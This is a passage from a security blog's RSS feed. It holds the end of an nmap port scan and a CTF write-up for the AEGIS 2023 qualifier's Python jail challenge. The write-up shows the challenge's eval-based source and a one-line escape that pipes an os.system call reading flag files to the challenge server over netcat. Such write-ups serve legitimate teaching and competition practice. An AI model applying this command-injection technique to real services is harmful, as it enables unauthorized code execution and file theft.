&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">5&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">14&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">5&lt;/span> to &lt;span style="color:#ae81ff">10&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">10&lt;/span> to &lt;span style="color:#ae81ff">20&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">20&lt;/span> to &lt;span style="color:#ae81ff">40&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">15&lt;/span> dropped probes since last increase.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Connect Scan at 01:50, 75.06s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> total ports&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#f92672">(&lt;/span>0.0085s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2023-10-02 01:49:05 EDT &lt;span style="color:#66d9ef">for&lt;/span> 75s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">998&lt;/span> filtered tcp ports &lt;span style="color:#f92672">(&lt;/span>no-response&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>443/tcp open https syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read data files from: /usr/bin/../share/nmap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#66d9ef">done&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span> IP address &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> host up&lt;span style="color:#f92672">)&lt;/span> scanned in 75.09 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
開的Port: 80/443&lt;/p></description></item><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="神盾盃2023初賽">
 神盾盃2023初賽
 &lt;a class="anchor" href="#%e7%a5%9e%e7%9b%be%e7%9b%832023%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="jail1">
 Jail1
 &lt;a class="anchor" href="#jail1">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;AEGIS&amp;gt; &amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;hint&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(__import__(&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cat jail.py&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Sorry, I don&amp;#39;t like any &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">FLAG&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(eval(ip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> error:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;ERROR:&amp;#34;&lt;/span>, error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Good luck next time!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat fla*&amp;#39;))&amp;#34;&lt;/span> | nc 35.234.20.42 &lt;span style="color:#ae81ff">8000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>AEGIS{600d_j0b_70_byp455_fl46}&lt;/code>&lt;/p>
&lt;h2 id="jail2">
 Jail2
 &lt;a class="anchor" href="#jail2">#&lt;/a>
&lt;/h2>
&lt;h3 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h3>
&lt;p>SSTI&lt;/p></description></item></channel></rss>